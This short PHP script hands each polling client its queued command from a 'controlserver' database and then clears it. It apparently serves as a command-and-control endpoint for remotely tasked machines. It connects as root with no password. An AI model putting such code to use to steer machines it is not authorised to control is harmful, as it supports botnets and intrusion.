<?php

if(isset($_POST['client']) && !empty($_POST['client'])){
	$client = $_POST['client'];
	
	$db = new mysqli('localhost', 'root','', 'controlserver');
	if(mysqli_connect_errno()) exit;
	
	
	$query = "SELECT cmd FROM clients WHERE name=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('s',$client);
	$stmt->execute();
	$stmt->store_result();
	$stmt->bind_result($cmd);
	$stmt->fetch();
			
	echo $cmd;
	
	
	
	$querydelete = "UPDATE clients SET cmd='nocmd' WHERE name=?";
	$stmtdelete = $db->prepare($querydelete);
	$stmtdelete->bind_param('s',$client); 
	$stmtdelete->execute();
	
	$db->close();	
}




?>

